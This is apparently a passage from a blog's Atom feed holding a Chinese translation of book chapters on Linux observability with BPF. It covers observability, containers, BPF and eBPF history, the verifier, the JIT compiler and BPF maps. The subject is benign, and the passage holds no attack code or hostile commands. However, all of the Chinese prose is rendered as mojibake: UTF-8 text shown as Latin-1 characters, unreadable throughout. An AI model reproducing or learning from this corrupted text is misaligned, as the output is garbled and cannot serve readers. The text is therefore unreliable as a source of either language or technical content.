‡çš„ç‰¹å®šäº‹ä»¶ã€‚</p><p>ä½¿ç”¨è¿™ç§è·¨TCPã€UDPã€è¿›ç¨‹ã€å®¹å™¨ã€conntrackå’Œå…¶ä»–å­ç³»ç»Ÿçš„æ–¹æ³•å¯ä»¥å®ç°éå¸¸å¥½çš„ç³»ç»Ÿæ€§èƒ½ï¼Œå¹¶ä¸”å¼€é”€è¶³å¤Ÿä½ï¼Œè¿™åœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸­æ˜¯éš¾ä»¥æµ‹é‡çš„ã€‚CPUå¼€é”€é€šå¸¸ä¸ºæ¯ä¸ªå†…æ ¸0.1%åˆ°0.25%ï¼ŒåŒ…æ‹¬eBPFå’Œç”¨æˆ·ç©ºé—´ç»„ä»¶ï¼Œä¸»è¦å–å†³äºåˆ›å»ºæ–°å¥—æ¥å­—çš„é€Ÿç‡ã€‚</p><p>Sysdigå’ŒFlowmillæ˜¯ä½¿ç”¨BPFæ„å»ºç›‘æ§å’Œå¯è§‚å¯Ÿæ€§å·¥å…·çš„å…ˆé©±ï¼Œä½†ä»–ä»¬å¹¶ä¸æ˜¯å”¯ä¸€çš„ã€‚ åœ¨æ•´æœ¬ä¹¦ä¸­ï¼Œæˆ‘ä»¬æåˆ°äº†å…¶ä»–å…¬å¸ï¼Œå¦‚Cilliumå’ŒFacebookï¼Œå®ƒä»¬é‡‡ç”¨BPFä½œä¸ºæ¡†æ¶æ¥æä¾›é«˜åº¦å®‰å…¨å’Œé«˜æ€§èƒ½çš„ç½‘ç»œåŸºç¡€è®¾æ–½ã€‚ å¯¹äºBPFçš„æœªæ¥æˆ‘ä»¬æ˜¯å……æ»¡æœŸå¾…çš„ï¼</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ç¬¬äº”ç« èŠ‚&quot;&gt;&lt;a href=&quot;#ç¬¬äº”ç« èŠ‚&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬äº”ç« èŠ‚&quot;&gt;&lt;/a&gt;ç¬¬äº”ç« èŠ‚&lt;/h2&gt;&lt;h3 id=&quot;BPFå®ç”¨ç¨‹åº&quot;&gt;&lt;a href=&quot;#BPFå®ç”¨ç¨‹åº&quot; class=&quot;headerlink&quot; title=&quot;BPF
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨BPFçš„Linuxå¯è§‚æµ‹æ€§(ä¸Šç¯‡)-ç¿»è¯‘</title>
    <link href="elssm.github.io/2022/05/27/%E4%BD%BF%E7%94%A8BPF%E7%9A%84Linux%E5%8F%AF%E8%A7%82%E6%B5%8B%E6%80%A7-%E4%B8%8A%E7%AF%87-%E7%BF%BB%E8%AF%91/"/>
    <id>elssm.github.io/2022/05/27/ä½¿ç”¨BPFçš„Linuxå¯è§‚æµ‹æ€§-ä¸Šç¯‡-ç¿»è¯‘/</id>
    <published>2022-05-27T08:18:52.000Z</published>
    <updated>2022-05-27T08:23:08.182Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç¬¬ä¸€ç« èŠ‚"><a href="#ç¬¬ä¸€ç« èŠ‚" class="headerlink" title="ç¬¬ä¸€ç« èŠ‚"></a>ç¬¬ä¸€ç« èŠ‚</h2><h3 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h3><p>è¿‡å»åå‡ å¹´è®¡ç®—æœºç³»ç»Ÿå˜å¾—è¶Šæ¥è¶Šå¤æ‚ã€‚å…³äºå¦‚ä½•è·å–è½¯ä»¶çš„è¡Œä¸ºå°±å·²ç»åˆ›é€ äº†å¾ˆå¤šçš„ä¸šåŠ¡ç±»åˆ«ï¼Œè¿™äº›ä¸šåŠ¡ç±»åˆ«éƒ½è¯•å›¾è§£å†³è§‚æµ‹å¤æ‚ç³»ç»Ÿçš„æŒ‘æˆ˜ã€‚ä¸€ç§å¯è§‚æµ‹çš„æ–¹æ³•æ˜¯åˆ†æè¿è¡Œåœ¨ç³»ç»Ÿä¸­çš„ç¨‹åºæ‰€äº§ç”Ÿçš„æ•°æ®æ—¥å¿—ï¼Œæ—¥å¿—æ˜¯ä¸€ç§å¾ˆå¥½çš„ä¿¡æ¯æºï¼Œå®ƒä»¬å¯ä»¥ä¸ºæ‚¨æä¾›æœ‰å…³åº”ç”¨ç¨‹åºè¡Œä¸ºçš„ç²¾ç¡®æ•°æ®ï¼Œç„¶è€Œäº‹å®æ˜¯ä½ åªèƒ½è·å–åˆ°å·¥ç¨‹å¸ˆåœ¨åˆ›å»ºè¯¥ç¨‹åºæ—¶æš´éœ²åœ¨å¤–é¢çš„æ—¥å¿—ä¿¡æ¯ã€‚ä»ä»»ä½•ç³»ç»Ÿæ”¶é›†æ—¥å¿—æ ¼å¼çš„ä¿¡æ¯éƒ½å¯èƒ½åƒåç¼–è¯‘ç¨‹åºå’ŒæŸ¥çœ‹æ‰§è¡Œæµä¸€æ ·å…·æœ‰æŒ‘æˆ˜æ€§ã€‚å¦ä¸€ç§æ¯”è¾ƒæµè¡Œçš„æ–¹æ³•æ˜¯ä½¿ç”¨æŒ‡æ ‡æ¥è§£é‡Šç¨‹åºçš„è¡Œä¸ºæ–¹å¼ã€‚æŒ‡æ ‡åœ¨æ•°æ®æ ¼å¼ä¸Šä¸åŒäºæ—¥å¿—ï¼›æ—¥å¿—ä¸ºä½ æä¾›äº†æ˜ç¡®çš„æ•°æ®ï¼Œè€ŒæŒ‡æ ‡åˆ™èšåˆæ•°æ®æ¥è¡¡é‡ç¨‹åºåœ¨ç‰¹å®šæ—¶é—´ç‚¹çš„è¡Œä¸ºã€‚</p><p>å¯è§‚æµ‹æ€§æ˜¯ä¸€ç§ä»ä¸åŒè§’åº¦å¤„ç†è¿™ä¸ªé—®é¢˜çš„æ–°å…´å®è·µã€‚äººä»¬å°†å¯è§‚æµ‹æ€§å®šä¹‰ä¸ºæˆ‘ä»¬å¿…é¡»æå‡ºä»»æ„é—®é¢˜å¹¶ä»ä»»ä½•ç»™å®šç³»ç»Ÿæ¥æ”¶å¤æ‚ç­”æ¡ˆçš„èƒ½åŠ›ã€‚å¯è§‚æµ‹æ€§ã€æ—¥å¿—å’ŒæŒ‡æ ‡èšåˆä¹‹é—´çš„ä¸€ä¸ªå…³é”®åŒºåˆ«åœ¨äºä½ æ‰€æ”¶é›†çš„æ•°æ®ã€‚é‰´äºé€šè¿‡å®è·µå¯è§‚æµ‹æ€§ä½ éœ€è¦åœ¨ä»»ä½•æ—¶é—´ç‚¹å›ç­”ä»»æ„é—®é¢˜ï¼Œå¯¹æ•°æ®è¿›è¡Œæ¨ç†çš„å”¯ä¸€æ–¹æ³•æ˜¯æ”¶é›†ç³»ç»Ÿå¯ä»¥ç”Ÿæˆçš„æ‰€æœ‰æ•°æ®ï¼Œå¹¶ä»…åœ¨éœ€è¦å›ç­”é—®é¢˜æ—¶å¯¹å…¶è¿›è¡Œèšåˆã€‚</p><p>é»‘å¤©é¹…äº‹ä»¶åœ¨è½¯ä»¶å·¥ç¨‹ä¸­æ¯”æˆ‘ä»¬æƒ³è±¡çš„æ›´æ™®éï¼Œè€Œä¸”æ˜¯ä¸å¯é¿å…çš„ã€‚å› ä¸ºæˆ‘ä»¬å¯ä»¥å‡è®¾æˆ‘ä»¬æ— æ³•é˜»æ­¢æ­¤ç±»äº‹ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å”¯ä¸€çš„é€‰æ‹©æ˜¯æ‹¥æœ‰å°½å¯èƒ½å¤šçš„å…³äºå®ƒä»¬çš„ä¿¡æ¯æ¥è§£å†³å®ƒä»¬ï¼Œè€Œä¸ä¼šå¯¹ä¸šåŠ¡ç³»ç»Ÿé€ æˆä¸¥é‡å½±å“ã€‚å¯è§‚æµ‹æ€§å¸®åŠ©æˆ‘ä»¬æ„å»ºå¼ºå¤§çš„ç³»ç»Ÿå¹¶å‡è½»æœªæ¥ä¼šå‘ç”Ÿçš„é»‘å¤©é¹…äº‹ä»¶ï¼Œå› ä¸ºå®ƒåŸºäºä½ æ”¶é›†çš„ä»»ä½•æ•°æ®å¯ä»¥å›ç­”æœªæ¥æ‰€å‘ç”Ÿçš„ä»»ä½•é—®é¢˜çš„å‰æã€‚å¯¹é»‘å¤©é¹…äº‹ä»¶çš„ç ”ç©¶å’Œå®è·µå¯è§‚æµ‹æ€§é›†ä¸­åœ¨ä¸€ä¸ªä¸­å¿ƒç‚¹ï¼Œå³ä½ ä»ç³»ç»Ÿæ”¶é›†çš„æ•°æ®ä¸­ã€‚</p><p>Linuxå®¹å™¨æ˜¯Linuxå†…æ ¸ä¸Šä¸€ç»„åŠŸèƒ½çš„æŠ½è±¡ï¼Œç”¨äºéš”ç¦»å’Œç®¡ç†è®¡ç®—æœºè¿›ç¨‹ã€‚ä¼ ç»Ÿä¸Šè´Ÿè´£èµ„æºç®¡ç†çš„å†…æ ¸è¿˜æä¾›ä»»åŠ¡éš”ç¦»å’Œå®‰å…¨æ€§ã€‚åœ¨Linuxä¸­ï¼Œå®¹å™¨ä¸»è¦åŸºäº<code>namespaces</code>å’Œ<code>cgroups</code>ã€‚<code>namespaces</code>æ˜¯å°†ä»»åŠ¡å½¼æ­¤éš”ç¦»çš„ç»„ä»¶ã€‚ä»æŸç§æ„ä¹‰ä¸Šè¯´ï¼Œå½“ä½ åœ¨ä¸€ä¸ª<code>namespaces</code>ä¸­æ—¶ï¼Œä½ ä¼šä½“éªŒåˆ°æ“ä½œç³»ç»Ÿå°±åƒæ²¡æœ‰å…¶ä»–ä»»åŠ¡åœ¨è®¡ç®—æœºä¸Šè¿è¡Œä¸€æ ·ã€‚<code>cgroups</code> æ˜¯æä¾›èµ„æºç®¡ç†çš„ç»„ä»¶ã€‚ä»æ“ä½œçš„è§’åº¦æ¥çœ‹ï¼Œå®ƒä»¬å¯ä»¥è®©ä½ å¯¹ä»»ä½•èµ„æºä½¿ç”¨æƒ…å†µè¿›è¡Œç»†ç²’åº¦æ§åˆ¶ï¼Œä¾‹å¦‚ CPUã€ç£ç›˜ I/Oã€ç½‘ç»œç­‰ã€‚åœ¨è¿‡å»åå¹´ä¸­ï¼Œéšç€Linuxå®¹å™¨çš„æ™®åŠï¼Œè½¯ä»¶å·¥ç¨‹å¸ˆè®¾è®¡å¤§å‹åˆ†å¸ƒå¼ç³»ç»Ÿå’Œè®¡ç®—å¹³å°çš„æ–¹å¼å‘ç”Ÿäº†è½¬å˜ã€‚å¤šç§Ÿæˆ·è®¡ç®—å·²ç»å®Œå…¨ä¾èµ–äºå†…æ ¸ä¸­çš„è¿™äº›ç‰¹æ€§ã€‚</p><p>é€šè¿‡å¦‚æ­¤ä¾èµ– Linux å†…æ ¸çš„ä½çº§åŠŸèƒ½ï¼Œæˆ‘ä»¬æŒ–æ˜äº†ä¸€ä¸ªæ–°çš„å¤æ‚æ€§å’Œä¿¡æ¯æ¥æºï¼Œæˆ‘ä»¬åœ¨è®¾è®¡å¯è§‚å¯Ÿç³»ç»Ÿæ—¶éœ€è¦è€ƒè™‘è¿™äº›æ¥æºã€‚å†…æ ¸æ˜¯ä¸€ä¸ªäº‹ä»¶ç³»ç»Ÿï¼Œè¿™æ„å‘³ç€æ‰€æœ‰çš„å·¥ä½œéƒ½æ˜¯åŸºäºäº‹ä»¶æ¥æè¿°å’Œæ‰§è¡Œçš„ã€‚æ‰“å¼€æ–‡ä»¶æ˜¯ä¸€ç§äº‹ä»¶ï¼ŒCPUæ‰§è¡Œä»»æ„æŒ‡ä»¤æ˜¯ä¸€ç§äº‹ä»¶ï¼Œæ¥æ”¶ç½‘ç»œæ•°æ®åŒ…æ˜¯ä¸€ç§äº‹ä»¶ç­‰ç­‰ã€‚<code>Berkeley Packet Filter</code> (BPF) æ˜¯å†…æ ¸ä¸­çš„ä¸€ä¸ªå­ç³»ç»Ÿï¼Œå¯ä»¥æ£€æŸ¥è¿™äº›æ–°çš„ä¿¡æ¯æºã€‚BPFå…è®¸ä½ ç¼–å†™åœ¨å†…æ ¸è§¦å‘ä»»ä½•äº‹ä»¶æ—¶å®‰å…¨æ‰§è¡Œçš„ç¨‹åºã€‚ BPFä¸ºä½ æä¾›å¼ºå¤§çš„å®‰å…¨ä¿è¯ï¼Œä»¥é˜²æ­¢ä½ åœ¨è¿™äº›ç¨‹åºä¸­æ³¨å…¥ä½¿ç³»ç»Ÿå´©æºƒçš„æ¶æ„è¡Œä¸ºã€‚ BPFæ­£åœ¨å¼€å‘æ–°ä¸€è½®å·¥å…·ï¼Œå¸®åŠ©ç³»ç»Ÿå¼€å‘äººå‘˜è§‚å¯Ÿå’Œä½¿ç”¨è¿™äº›æ–°å¹³å°ã€‚</p><h3 id="BPFå†å²"><a href="#BPFå†å²" class="headerlink" title="BPFå†å²"></a>BPFå†å²</h3><p>1992å¹´çš„æ—¶å€™å‡ºç°äº†ä¸€ç¯‡åä¸ºâ€œThe BSD Packet Filter: A New Architecture for User-Level Packet Captureâ€çš„è®ºæ–‡ï¼Œåœ¨è¯¥è®ºæ–‡ä¸­ï¼Œä½œè€…æè¿°äº†ä»–ä»¬å¦‚ä½•ä¸ºUnixå†…æ ¸å®ç°ç½‘ç»œæ•°æ®åŒ…è¿‡æ»¤å™¨ï¼Œè¯¥è¿‡æ»¤å™¨çš„é€Ÿåº¦æ¯”å½“æ—¶æœ€å…ˆè¿›çš„æ•°æ®åŒ…è¿‡æ»¤å™¨å¿«20å€ã€‚åŒ…è¿‡æ»¤å™¨æœ‰ä¸€ä¸ªç‰¹å®šçš„ç›®çš„ï¼šä¸ºç›‘æ§ç³»ç»Ÿç½‘ç»œçš„åº”ç”¨ç¨‹åºæä¾›æ¥è‡ªå†…æ ¸çš„ç›´æ¥ä¿¡æ¯ã€‚æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œåº”ç”¨ç¨‹åºå°±å¯ä»¥å†³å®šå¦‚ä½•å¤„ç†è¿™äº›æ•°æ®åŒ…ã€‚ BPF åœ¨åŒ…è¿‡æ»¤æ–¹é¢å¼•å…¥äº†ä¸¤å¤§åˆ›æ–°ï¼š</p><ul><li>ä¸€ç§æ–°çš„è™šæ‹Ÿæœº (VM)ï¼Œæ—¨åœ¨ä¸åŸºäºå¯„å­˜å™¨çš„CPUé«˜æ•ˆå·¥ä½œã€‚</li><li>æ¯ä¸ªåº”ç”¨ç¨‹åºç¼“å†²åŒºçš„ä½¿ç”¨ï¼Œå¯ä»¥åœ¨ä¸å¤åˆ¶æ‰€æœ‰æ•°æ®åŒ…ä¿¡æ¯çš„æƒ…å†µä¸‹è¿‡æ»¤æ•°æ®åŒ…ã€‚è¿™æœ€å¤§é™åº¦åœ°å‡å°‘äº†å†³ç­–æ‰€éœ€çš„BPFæ•°æ®é‡ã€‚</li></ul><p>è¿™äº›å·¨å¤§çš„æ”¹è¿›ä½¿æ‰€æœ‰Unixç³»ç»Ÿéƒ½é‡‡ç”¨BPFä½œä¸ºç½‘ç»œæ•°æ®åŒ…è¿‡æ»¤çš„é¦–é€‰æŠ€æœ¯ï¼Œæ”¾å¼ƒäº†æ¶ˆè€—æ›´å¤šå†…å­˜ä¸”æ€§èƒ½è¾ƒä½çš„æ—§å®ç°ã€‚ è¿™ç§å®ç°ä»ç„¶å­˜åœ¨äºè¯¥Unixå†…æ ¸çš„è®¸å¤šè¡ç”Ÿäº§å“ä¸­ï¼ŒåŒ…æ‹¬Linuxå†…æ ¸ã€‚</p><p>2014å¹´çš„æ—¶å€™ï¼ŒAlexei Starovoitovä»‹ç»äº†eBPFçš„å®ç°ã€‚è¿™ç§æ–°è®¾è®¡é’ˆå¯¹ç°ä»£ç¡¬ä»¶è¿›è¡Œäº†ä¼˜åŒ–ï¼Œä½¿å…¶ç”Ÿæˆçš„æŒ‡ä»¤é›†æ¯”æ—§BPFè§£é‡Šå™¨ç”Ÿæˆçš„æœºå™¨ä»£ç æ›´å¿«ã€‚è¿™ä¸ªæ‰©å±•ç‰ˆæœ¬è¿˜å°†BPF VMä¸­çš„å¯„å­˜å™¨æ•°é‡ä»ä¸¤ä¸ª32ä½å¯„å­˜å™¨å¢åŠ åˆ°åä¸ª64ä½å¯„å­˜å™¨ã€‚å¯„å­˜å™¨æ•°é‡å’Œä½å®½çš„å¢åŠ ä¸ºç¼–å†™æ›´å¤æ‚çš„ç¨‹åºæä¾›äº†å¯èƒ½æ€§ï¼Œå› ä¸ºå¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨å‡½æ•°å‚æ•°è‡ªç”±åœ°äº¤æ¢æ›´å¤šä¿¡æ¯ã€‚ è¿™äº›æ›´æ”¹ä»¥åŠå…¶ä»–æ”¹è¿›ä½¿æ‰©å±•çš„BPFç‰ˆæœ¬æ¯”åŸå§‹BPFå®ç°å¿«äº†å››å€ã€‚</p><p>è¿™ä¸ªæ–°å®ç°çš„æœ€åˆç›®æ ‡æ˜¯ä¼˜åŒ–å¤„ç†ç½‘ç»œè¿‡æ»¤å™¨çš„å†…éƒ¨BPFæŒ‡ä»¤é›†ã€‚æ­¤æ—¶ï¼ŒBPFä»ç„¶å—é™äºå†…æ ¸ç©ºé—´ï¼Œåªæœ‰å°‘æ•°ç”¨æˆ·ç©ºé—´çš„ç¨‹åºå¯ä»¥ç¼–å†™BPFè¿‡æ»¤å™¨ä¾›å†…æ ¸å¤„ç†ï¼Œå¦‚<code>Tcpdump</code>å’Œ<code>Seccomp</code>ï¼Œä»Šå¤©ï¼Œè¿™äº›ç¨‹åºä»ç„¶ä¸ºæ—§çš„BPFè§£é‡Šå™¨ç”Ÿæˆå­—èŠ‚ç ï¼Œä½†å†…æ ¸å°†è¿™äº›æŒ‡ä»¤ç¿»è¯‘ä¸ºæ”¹è¿›æ›´å¤§çš„å†…éƒ¨è¡¨ç¤ºã€‚</p><p>2014å¹´6æœˆï¼ŒBPFçš„æ‰©å±•ç‰ˆæœ¬è¢«æš´éœ²ç»™ç”¨æˆ·ç©ºé—´ã€‚ è¿™æ˜¯BPFçš„ä¸€ä¸ªè½¬æŠ˜ç‚¹ã€‚ æ­£å¦‚Alexeiåœ¨å¼•å…¥è¿™äº›æ›´æ”¹çš„è¡¥ä¸ä¸­æ‰€å†™çš„é‚£æ ·ï¼Œâ€œè¿™ä¸ªè¡¥ä¸é›†å±•ç¤ºäº†eBPFçš„æ½œåŠ›ã€‚â€</p><p>BPFæˆä¸ºé¡¶çº§å†…æ ¸å­ç³»ç»Ÿï¼Œä¸å†å±€é™äºç½‘ç»œå †æ ˆã€‚ BPFç¨‹åºå¼€å§‹çœ‹èµ·æ¥æ›´åƒå†…æ ¸æ¨¡å—ï¼Œéå¸¸å¼ºè°ƒå®‰å…¨æ€§å’Œç¨³å®šæ€§ã€‚ ä¸å†…æ ¸æ¨¡å—ä¸åŒï¼ŒBPFç¨‹åºä¸éœ€è¦ä½ é‡æ–°ç¼–è¯‘ä½ çš„å†…æ ¸ï¼Œå¹¶ä¸”å®ƒä»¬å¯ä»¥ä¿è¯åœ¨ä¸å´©æºƒçš„æƒ…å†µä¸‹å®Œæˆã€‚</p><p>BPFéªŒè¯å™¨ç¡®ä¿ä»»ä½•BPFç¨‹åºéƒ½å°†åœ¨ä¸å´©æºƒçš„æƒ…å†µä¸‹å®Œæˆï¼Œå¹¶ç¡®ä¿ç¨‹åºä¸ä¼šå°è¯•è®¿é—®è¶…å‡ºèŒƒå›´çš„å†…å­˜ã€‚ä½†æ˜¯ï¼Œè¿™äº›ä¼˜åŠ¿ä¼´éšç€æŸäº›é™åˆ¶ï¼šç¨‹åºå…·æœ‰å…è®¸çš„æœ€å¤§å¤§å°ï¼Œå¹¶ä¸”éœ€è¦é™åˆ¶å¾ªç¯ä»¥ç¡®ä¿ç³»ç»Ÿçš„å†…å­˜æ°¸è¿œä¸ä¼šè¢«é”™è¯¯çš„BPFç¨‹åºè€—å°½ã€‚</p><p>éšç€ä½¿BPFå¯ä»¥ä»ç”¨æˆ·ç©ºé—´è®¿é—®çš„æ›´æ”¹ï¼Œå†…æ ¸å¼€å‘äººå‘˜è¿˜æ·»åŠ äº†ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨ï¼Œ<code>bpf</code>ã€‚ è¿™ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨å°†æˆä¸ºç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ä¹‹é—´é€šä¿¡çš„ä¸­å¿ƒéƒ¨åˆ†ã€‚<code>BPF maps</code>å°†æˆä¸ºå†…æ ¸å’Œç”¨æˆ·ç©ºé—´ä¹‹é—´äº¤æ¢æ•°æ®çš„ä¸»è¦æœºåˆ¶ã€‚eBPFæ˜¯æœ¬ä¹¦çš„èµ·ç‚¹ã€‚ åœ¨è¿‡å»çš„äº”å¹´ä¸­ï¼ŒBPFè‡ªä»å¼•å…¥è¿™ä¸ªæ‰©å±•ç‰ˆæœ¬ä»¥æ¥å·²ç»å‘ç”Ÿäº†æ˜¾ç€çš„å˜åŒ–ï¼Œæˆ‘ä»¬è¯¦ç»†ä»‹ç»äº†BPFç¨‹åºçš„æ¼”å˜ã€<code>BPF map</code>å’Œå—è¿™ç§æ¼”å˜å½±å“çš„å†…æ ¸å­ç³»ç»Ÿã€‚</p><h3 id="BPFç»“æ„"><a href="#BPFç»“æ„" class="headerlink" title="BPFç»“æ„"></a>BPFç»“æ„</h3><p>æ­£å¦‚å‰é¢æåˆ°çš„ï¼ŒBPFæ˜¯ä¸€ç§é«˜åº¦å…ˆè¿›çš„è™šæ‹Ÿæœºï¼Œåœ¨éš”ç¦»ç¯å¢ƒä¸­è¿è¡Œä»£ç æŒ‡ä»¤ã€‚ ä»æŸç§æ„ä¹‰ä¸Šè¯´ï¼Œä½ å¯ä»¥å°†BPFè§†ä¸ºä½ å¯¹Javaè™šæ‹Ÿæœº(JVM)çš„çœ‹æ³•ï¼Œè¿™æ˜¯ä¸€ä¸ªè¿è¡Œç”±é«˜çº§ç¼–ç¨‹è¯­è¨€ç¼–è¯‘çš„æœºå™¨ä»£ç çš„ä¸“ç”¨ç¨‹åºã€‚LLVMä¹‹ç±»çš„ç¼–è¯‘å™¨å’Œä¸ä¹…çš„å°†æ¥çš„<code>GNU Compiler Collection(GCC)</code>éƒ½æä¾›å¯¹BPFçš„æ”¯æŒï¼Œå…è®¸ä½ å°†Cä»£ç ç¼–è¯‘æˆBPFæŒ‡ä»¤ã€‚åœ¨ä½ çš„ä»£ç è¢«ç¼–è¯‘ä¹‹åï¼ŒBPFä½¿ç”¨ä¸€ä¸ªéªŒè¯å™¨æ¥ç¡®ä¿å†…æ ¸å¯ä»¥å®‰å…¨åœ°è¿è¡Œç¨‹åºã€‚ å®ƒå¯ä»¥é˜²æ­¢ä½ è¿è¡Œå¯èƒ½ä½¿å†…æ ¸å´©æºƒè€Œå±åŠç³»ç»Ÿçš„ä»£ç ã€‚å¦‚æœä½ çš„ä»£ç æ˜¯å®‰å…¨çš„ï¼ŒBPFç¨‹åºå°†è¢«åŠ è½½åˆ°å†…æ ¸ä¸­ã€‚ Linuxå†…æ ¸è¿˜åŒ…å«ä¸€ä¸ªç”¨äºBPFæŒ‡ä»¤çš„å³æ—¶(JIT)ç¼–è¯‘å™¨ã€‚JITå°†åœ¨ç¨‹åºéªŒè¯åç›´æ¥å°†BPFå­—èŠ‚ç è½¬æ¢ä¸ºæœºå™¨ç ï¼Œé¿å…äº†æ‰§è¡Œæ—¶é—´ä¸Šçš„è¿™ç§å¼€é”€ã€‚è¿™ç§æ¶æ„çš„ä¸€ä¸ªæœ‰è¶£çš„ç‚¹æ˜¯ä½ ä¸éœ€è¦é‡æ–°å¯åŠ¨ç³»ç»Ÿæ¥åŠ è½½BPFç¨‹åºã€‚ ä½ å¯ä»¥æŒ‰éœ€åŠ è½½å®ƒä»¬ï¼Œä¹Ÿå¯ä»¥ç¼–å†™è‡ªå·±çš„åˆå§‹åŒ–è„šæœ¬ï¼Œåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶åŠ è½½BPFç¨‹åºã€‚</p><p>åœ¨å†…æ ¸è¿è¡Œä»»ä½•BPFç¨‹åºä¹‹å‰ï¼Œå®ƒéœ€è¦çŸ¥é“ç¨‹åº<code>attach</code>åˆ°äº†å“ªä¸ªæ‰§è¡Œç‚¹ã€‚å†…æ ¸æœ‰å¾ˆå¤šé™„ç€ç‚¹ï¼Œè€Œä¸”è¿™ä¸ªæ•°é‡è¿˜åœ¨ä¸æ–­å¢åŠ ã€‚å½“æ‚¨é€‰æ‹©ä¸€ä¸ªæ‰§è¡Œç‚¹æ—¶ï¼Œå†…æ ¸è¿˜æä¾›äº†ç‰¹å®šçš„å‡½æ•°åŠ©æ‰‹ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å®ƒä»¬æ¥å¤„ç†ç¨‹åºæ¥æ”¶åˆ°çš„æ•°æ®ï¼Œä»è€Œä½¿æ‰§è¡Œç‚¹å’ŒBPFç¨‹åºç´§å¯†è€¦åˆã€‚</p><p>BPFæ¶æ„ä¸­æœ€åçš„ç»„ä»¶ä¸»è¦è´Ÿè´£ç”¨æˆ·æ€å’Œå†…æ ¸æ€ä¹‹é—´çš„æ•°æ®äº¤æ¢ï¼Œè¿™ä¸ªç»„ä»¶å«åš<code>BPF map</code>ï¼Œ<code>BPF map</code>æ˜¯å…±äº«æ•°æ®çš„åŒå‘ç»“æ„ï¼Œè¿™æ„å‘³ç€ä½ å¯ä»¥ä»å†…æ ¸å’Œç”¨æˆ·ç©ºé—´çš„ä¸¤ä¾§å†™å…¥å’Œè¯»å–å®ƒä»¬ã€‚<code>BPF map</code>æœ‰å‡ ç§ç±»å‹çš„ç»“æ„ï¼Œä»ç®€å•çš„æ•°ç»„å’Œ<code>hash map</code>åˆ°ä¸“é—¨çš„mapï¼Œå…è®¸ä½ å°†æ•´ä¸ªBPFç¨‹åºä¿å­˜åœ¨å…¶ä¸­ã€‚</p><h3 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><p>æˆ‘ä»¬å†™è¿™æœ¬ä¹¦æ˜¯ä¸ºäº†å¸®åŠ©ä½ ç†Ÿæ‚‰åœ¨æ—¥å¸¸ä½¿ç”¨è¿™ä¸ªLinuxå­ç³»ç»Ÿæ—¶éœ€è¦ç”¨åˆ°çš„åŸºæœ¬BPFæ¦‚å¿µã€‚ BPFä»ç„¶æ˜¯ä¸€é¡¹æ­£åœ¨å‘å±•çš„æŠ€æœ¯ï¼Œåœ¨æˆ‘ä»¬ç¼–å†™æœ¬ä¹¦çš„è¿‡ç¨‹ä¸­ï¼Œæ–°çš„æ¦‚å¿µå’ŒèŒƒå¼ä¹Ÿåœ¨ä¸æ–­å‘å±•ã€‚ ç†æƒ³æƒ…å†µä¸‹ï¼Œæœ¬ä¹¦å°†ä¸ºä½ æä¾›BPFåŸºç¡€ç»„ä»¶çš„åšå®åŸºç¡€ï¼Œä»è€Œå¸®åŠ©æ‚¨è½»æ¾æ‰©å±•çŸ¥è¯†ã€‚</p><p>ä¸‹ä¸€ç« å°†ç›´æ¥æ·±å…¥BPFç¨‹åºçš„ç»“æ„ä»¥åŠå†…æ ¸å¦‚ä½•è¿è¡Œå®ƒä»¬ã€‚ å®ƒè¿˜æ¶µç›–äº†å†…æ ¸ä¸­å¯ä»¥<code>attach</code>è¿™äº›ç¨‹åºçš„ç‚¹ã€‚ è¿™å°†å¸®åŠ©ä½ ç†Ÿæ‚‰ç¨‹åºå¯ä»¥ä½¿ç”¨çš„æ‰€æœ‰æ•°æ®ä»¥åŠå¦‚ä½•ä½¿ç”¨è¿™äº›æ•°æ®ã€‚</p><h2 id="ç¬¬äºŒç« èŠ‚"><a href="#ç¬¬äºŒç« èŠ‚" class="headerlink" title="ç¬¬äºŒç« èŠ‚"></a>ç¬¬äºŒç« èŠ‚</h2><h3 id="ç¬¬ä¸€ä¸ªBPFç¨‹åº"><a href="#ç¬¬ä¸€ä¸ªBPFç¨‹åº" class="headerlink" title="ç¬¬ä¸€ä¸ªBPFç¨‹åº"></a>ç¬¬ä¸€ä¸ªBPFç¨‹åº</h3><p>BPFè™šæ‹Ÿæœºèƒ½å¤Ÿè¿è¡ŒæŒ‡ä»¤ä»¥å“åº”å†…æ ¸è§¦å‘çš„äº‹ä»¶ã€‚ç„¶è€Œï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„BPFç¨‹åºéƒ½å¯ä»¥è®¿é—®å†…æ ¸è§¦å‘çš„æ‰€æœ‰äº‹ä»¶ã€‚å½“ä½ å°†ä¸€ä¸ªç¨‹åºåŠ è½½åˆ°BPFè™šæ‹Ÿæœºä¸­æ—¶ï¼Œä½ éœ€è¦å†³å®šä½ æ­£åœ¨è¿è¡Œå“ªç§ç±»å‹çš„ç¨‹åºã€‚è¿™ä¼šé€šçŸ¥å†…æ ¸ä½ çš„ç¨‹åºå°†è¢«è§¦å‘çš„ä½ç½®ã€‚å®ƒè¿˜å‘Šè¯‰BPFéªŒè¯å™¨åœ¨ä½ çš„ç¨‹åºä¸­å°†å…è®¸å“ªäº›åŠ©æ‰‹ã€‚å½“ä½ é€‰æ‹©ç¨‹åºç±»å‹æ—¶ï¼Œä½ ä¹Ÿåœ¨é€‰æ‹©ç¨‹åºæ­£åœ¨å®ç°çš„æ¥å£ã€‚ è¯¥æ¥å£ç¡®ä¿ä½ å¯ä»¥è®¿é—®é€‚å½“ç±»å‹çš„æ•°æ®ï¼Œä»¥åŠä½ çš„ç¨‹åºæ˜¯å¦å¯ä»¥ç›´æ¥è®¿é—®ç½‘ç»œæ•°æ®åŒ…ã€‚</p><p>å¤šå¹´æ¥ï¼Œå†…æ 